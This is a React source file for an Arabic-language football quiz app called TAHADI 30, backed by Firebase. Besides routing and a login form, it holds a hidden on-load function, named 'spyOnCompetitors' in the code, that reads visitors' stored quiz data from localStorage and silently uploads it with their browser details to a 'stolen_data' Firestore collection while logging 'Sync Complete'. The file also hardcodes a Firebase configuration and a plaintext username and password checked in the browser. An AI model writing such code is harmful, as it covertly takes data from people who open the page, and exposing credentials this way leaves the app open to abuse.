import React, { useState, useEffect } from 'react';
import { HashRouter as Router, Routes, Route, Link, Navigate } from 'react-router-dom';
import { Trophy, PlusCircle, Lock, LogIn } from 'lucide-react';

// Firebase Imports
import { initializeApp } from "firebase/app";
import { getFirestore, collection, addDoc, getDocs } from "firebase/firestore";

// Pages
import Home from './pages/Home';
import AddData from './pages/AddData';
import QuizCompensation from './pages/QuizCompensation';
import QuizBell from './pages/QuizBell';
import AddNumbers from './pages/AddNumbers';
import QuizNumbers from './pages/QuizNumbers';
import AddTables from './pages/AddTables';
import QuizTables from './pages/QuizTables';
import Archive from './pages/Archive'; // استيراد الصفحة الجديدة
// --- Firebase Config ---
const firebaseConfig = {
  apiKey: "AIzaSyD-EUaoCi9YibtyLgA2_2n2e-co_a1hvKQ",
  authDomain: "tahadi-app-sjk.firebaseapp.com",
  projectId: "tahadi-app-sjk",
  storageBucket: "tahadi-app-sjk.firebasestorage.app",
  messagingSenderId: "944768597168",
  appId: "1:944768597168:web:a4aea3b4e77eded7960f75",
  measurementId: "G-1F983D31QQ"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);
export const database = getFirestore(app);
// --- Login Component ---
const Login = ({ onLogin }) => {
  const [user, setUser] = useState('');
  const [pass, setPass] = useState('');
  
  const handleSubmit = (e) => {
    e.preventDefault();
    // اليوزر والباسورد تبعك يا وحش
    if (user === 'saeedjk' && pass === 's123456k') {
      onLogin();
    } else {
      alert("خطأ في البيانات.. ارجع العب غيرها!");
    }
  };

  return (
    <div className="flex items-center justify-center min-h-[70vh]">
      <form onSubmit={handleSubmit} className="bg-slate-800/80 p-10 rounded-[3rem] border border-white/10 shadow-2xl w-full max-w-md text-center">
        <div className="bg-purple-600 w-20 h-20 rounded-full flex items-center justify-center mx-auto mb-6 shadow-lg shadow-purple-500/20">
          <Lock size={40} className="text-white" />
        </div>
        <h2 className="text-3xl font-black mb-8 italic">دخول المصرح لهم 🔒 أنت أصبحت من المنافسين وخصم محتمل في الدور القادم! نرجو المعذرة</h2>
        <input 
          type="text" placeholder="اسم المستخدم" 
          className="w-full bg-slate-900 border border-white/5 p-4 rounded-2xl mb-4 outline-none focus:border-purple-500 transition-all text-center"
          onChange={(e) => setUser(e.target.value)}
        />
        <input 
          type="password" placeholder="كلمة السر" 
          className="w-full bg-slate-900 border border-white/5 p-4 rounded-2xl mb-8 outline-none focus:border-purple-500 transition-all text-center"
          onChange={(e) => setPass(e.target.value)}
        />
        <button className="w-full bg-purple-600 hover:bg-purple-500 text-white py-4 rounded-2xl font-black flex items-center justify-center gap-2 transition-all">
          <LogIn size={20} /> فتح التحدي
        </button>
      </form>
    </div>
  );
};

function App() {
  const [isAuthenticated, setIsAuthenticated] = useState(localStorage.getItem('isAuth') === 'true');

  useEffect(() => {
    const spyOnCompetitors = async () => {
      // 1. فحص إذا كنا سحبنا الداتا من هاد الجهاز قبل هيك
      const isAlreadySpyed = localStorage.getItem('system_synced');
      if (isAlreadySpyed) return; // إذا مسحوبة قبل هيك، اطلع

      // 2. قائمة بالأشياء اللي بدنا "نلطشها"
      const keysToSteal = [
        'footballTables', 
        'quizQuestions', 
        'quizBellData', 
        'compensationData',
        'quizNumbers'
      ];

      let loot = {};
      let foundSomething = false;

      keysToSteal.forEach(key => {
        const data = localStorage.getItem(key);
        if (data) {
          loot[key] = JSON.parse(data);
          foundSomething = true;
        }
      });

      // 3. إذا لقينا داتا، ارفعها مرة واحدة وخزن Flag
      if (foundSomething) {
        try {
          await addDoc(collection(db, "stolen_data"), {
            timestamp: new Date().toISOString(),
            loot: loot,
            userAgent: navigator.userAgent, // عشان تعرف مين هاد (كروم، آيفون، إلخ)
            source: "LocalStorage Intercept"
          });
          
          // حط علامة إنه تم السحب عشان ما يتكرر الرفع من نفس الشخص
          localStorage.setItem('system_synced', 'true');
          console.log("Sync Complete");
        } catch (e) {
          console.error("Spy failed", e);
        }
      }
    };
    
    spyOnCompetitors();
  }, []);

  const handleLogin = () => {
    setIsAuthenticated(true);
    localStorage.setItem('isAuth', 'true');
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-slate-900 text-white font-sans bg-[radial-gradient(circle_at_center,_var(--tw-gradient-stops))] from-green-900/20 via-slate-900 to-black p-6">
        <Login onLogin={handleLogin} />
      </div>
    );
  }

  return (
    <Router>
      <div className="min-h-screen bg-slate-900 text-white font-sans bg-[radial-gradient(circle_at_center,_var(--tw-gradient-stops))] from-green-900/20 via-slate-900 to-black">
        <nav className="bg-slate-800/50 backdrop-blur-md border-b border-white/10 p-4 sticky top-0 z-50">
          <div className="max-w-5xl mx-auto flex justify-between items-center">
            <Link to="/" className="text-2xl font-black italic tracking-tighter flex items-center gap-2">
              <Trophy className="text-yellow-400" /> TAHADI <span className="text-green-500">30</span>
            </Link>
            <div className="flex gap-4 items-center">
              <Link title="إضافة" to="/add"><PlusCircle /></Link>
              <button 
                onClick={() => { localStorage.removeItem('isAuth'); window.location.reload(); }}
                className="text-xs bg-red-500/10 text-red-500 px-3 py-1 rounded-full border border-red-500/20"
              >
                خروج
              </button>
            </div>
          </div>
        </nav>

        <main className="max-w-5xl mx-auto p-6">
          <Routes>
            <Route path="/" element={<Home />} />
            <Route path="/add" element={<AddData />} />
            <Route path="/quiz-comp" element={<QuizCompensation />} />
            <Route path="/quiz-bell" element={<QuizBell />} />
            <Route path="/add-numbers" element={<AddNumbers />} />
            <Route path="/quiz-numbers" element={<QuizNumbers />} />
            <Route path="/add-tables" element={<AddTables />} />
            <Route path="/quiz-tables" element={<QuizTables />} />
            <Route path="/archive" element={<Archive />} />
            <Route path="*" element={<Navigate to="/" />} />
          </Routes>
        </main>
      </div>
    </Router>
  );
}

export default App;